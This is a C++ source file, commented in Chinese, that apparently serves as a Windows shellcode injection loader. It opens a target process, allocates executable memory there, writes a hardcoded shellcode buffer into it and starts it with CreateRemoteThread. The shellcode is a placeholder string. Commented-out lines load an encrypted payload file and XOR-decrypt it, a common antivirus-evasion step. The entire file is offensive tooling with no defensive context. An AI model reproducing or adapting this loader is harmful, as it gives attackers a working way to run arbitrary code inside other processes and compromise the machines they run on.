#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <cstring>

int main(int argc,char *argv[])
{
	using namespace std;

	DWORD oldPtc;
	DWORD dwProcessId;

	//Usage:CRTinjection.exe ProcessID

	if (argc == 1)
	{
		dwProcessId = GetCurrentProcessId();
	}
	else {
		dwProcessId = atoi(argv[1]);
	}

	/*ifstream binFile("encrypt.bin", ios::binary);
	if (!binFile)
	{
		cout << "无法打开文件" << endl;
		return -1;
	}

	// 获取文件长度
	binFile.seekg(0, binFile.end);
	int length = binFile.tellg();
	binFile.seekg(0, binFile.beg);

	// 动态分配空间，保存文件内容
	char* buf = new char[length];
	binFile.read(buf, length);*/

	//硬编码异或后的shellcode
	unsigned char buf[] = "<shellcode_hex>";

	//获取shellcode字节大小
	SIZE_T length = sizeof(buf);

	//异或解密shellcode,
	/*for (int i = 0;i < length;i++) {
		buf[i] = buf[i] ^ 89;
	}*/
	
	
	//获取指定进程的handle
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);

	//在目标进程空间中申请内存
	LPVOID bufAddr = VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);

	//复制shellcode进已申请的内存
	WriteProcessMemory(hProcess, bufAddr, buf, length,NULL);

	Sleep(1000);
	
	//改变已申请的内存保护属性为PAGE_EXECUTE(可执行)
	VirtualProtectEx(hProcess,bufAddr,length,PAGE_EXECUTE,&oldPtc);

	//创建远程线程执行shellcode
	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)bufAddr, NULL, 0, NULL);

	//关闭目标进程句柄
	CloseHandle(hProcess);
	return 0;
}
